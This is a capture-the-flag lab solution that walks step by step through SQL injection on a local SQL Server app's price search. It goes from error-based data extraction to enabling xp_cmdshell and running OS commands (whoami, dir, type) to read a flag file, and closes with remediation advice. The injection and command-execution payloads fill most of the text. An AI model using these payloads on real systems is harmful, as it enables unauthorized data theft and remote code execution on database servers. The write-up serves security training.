# Solution — SQLi With A Twist (spoilers)

> ⚠️ Authorized, local, educational use only. This walkthrough follows the **Windows database** setup (Path A in the README), so the commands are Windows (`dir`, `type`) and the flag lives at `C:\Users\Public\Flag.txt`.

**Target:** the price search — `GET http://localhost:8080/search?price=<PAYLOAD>` (the `/inventory` box hits the same endpoint).
**Why the payloads look the way they do:** `price` is concatenated inside `LIKE '<price>%'`, so every payload opens with `'` and ends with `--`. The response is plain text: matching prices as CSV, or an HTTP 500 whose body is the raw SQL error — that error is the extraction channel.

Baseline: `?price=10` -> `10,100,101,105,1000,1050`.

---

### 1. Detect — a stray single quote breaks the string:

```
10'
```

-> 500 `Unclosed quotation mark after the character string...` = injectable.

### 2. Boolean — true vs false (both HTTP 200):

```
' OR 1=1--
```

```
' OR 1=2--
```

-> `1=1` returns all prices, `1=2` returns none.

**✅ First vulnerability: SQL Injection (various types)**

### 3. Column count — one column comes back:

```
' UNION SELECT 1--
```

```
' UNION SELECT 1,2--
```

-> `1` works (200), `1,2` errors (`All queries ... must have an equal number of columns`) = exactly one column.

### 4. Current database — the selected column is numeric (`INT`), so a string forced through `UNION` fails conversion and leaks in the error:

```
' UNION SELECT DB_NAME()--
```

-> 500 leaks `StoreDb`. (This is really **error-based** extraction via the type-conversion error, not classic in-band UNION.)

### 5. Version / DBMS:

```
' UNION SELECT @@version--
```

-> 500 leaks e.g. `Microsoft SQL Server 2022 ...` (whichever edition you installed).

**✅ Second vulnerability: Sensitive information disclosure in error messages**

### 6. All databases on the server:

```
' UNION SELECT STRING_AGG(name,',') FROM sys.databases--
```

-> leaks `master,tempdb,model,msdb,StoreDb,VaultDb` — a second app database, `VaultDb`, lives on the same instance.

**✅ Third vulnerability: Lack of database isolation**

### 7. Cross into `VaultDb` (allowed because we're sysadmin) — tables, then the `Flag` table's columns, then its data:

```
' UNION SELECT STRING_AGG(name,',') FROM VaultDb.sys.tables--
```

```
' UNION SELECT STRING_AGG(COLUMN_NAME,',') FROM VaultDb.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Flag'--
```

```
' UNION SELECT STRING_AGG(note,',') FROM VaultDb.dbo.Flag--
```

-> leaks `Nice try but the flag will be found with more effort`. **Decoy** — the real flag isn't in any database.

---

## SQL Injection -> Remote Code Execution 🏆

### 8. Are we a DBA?

```
' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--
```

-> returns `1`. That single digit is the difference between RCE and no RCE.

**✅ Fourth vulnerability: the app login is a member of the highest-privileged `sysadmin` role**

### 9. Is `xp_cmdshell` available?

```
' UNION SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'--
```

-> `0` = disabled. But as sysadmin we can turn it on:

```
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

Re-check:

```
' UNION SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'--
```

-> `1` = enabled.

**✅ Fifth vulnerability: OS command execution is now available on the server**

### 10. Run a command — but nothing comes back:

```
'; EXEC master..xp_cmdshell 'whoami';--
```

-> HTTP 200, empty. This is **Blind RCE**: the command runs, but the app returns only the **first** result set (the price query) and discards everything else — `xp_cmdshell`'s output never reaches the HTTP response. We need to route the output back through a channel we *can* read: the error message.

## The Endgame 🃏

### 11. Run the command and store its output in a table we control:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
```

### 12. Read that table back through the error channel:

```
' UNION SELECT line FROM dbo.rce_out WHERE line IS NOT NULL--
```

-> 500 leaks the output of `whoami` (e.g. `nt authority\system` or the SQL service account).

**🏆 Critical finding: SQL Injection leading to Remote Code Execution (RCE)**

### 13. Capture the flag — remember the hint (`Users Public`). List the directory:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'dir /b C:\Users\Public';--
```

```
' UNION SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL--
```

-> you'll see `Flag.txt`. Now read it:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'type C:\Users\Public\Flag.txt';--
```

```
' UNION SELECT line FROM dbo.rce_out WHERE line IS NOT NULL--
```

-> 🚩 `This Is The KfirVerse flag - Congrats :)`

---

## Recap — five weaknesses chained into one critical impact

1. SQL Injection (various types).
2. Sensitive information disclosure in error messages.
3. Lack of database isolation.
4. Application login in the `sysadmin` role.
5. OS command execution (`xp_cmdshell`) available.

**Result:** SQL Injection -> Remote Code Execution on the server.

Remediation maps to the OWASP WSTG and CWE for each item: parameterize and validate input, return generic errors, isolate databases, apply least privilege to the app login, and keep `xp_cmdshell` disabled.
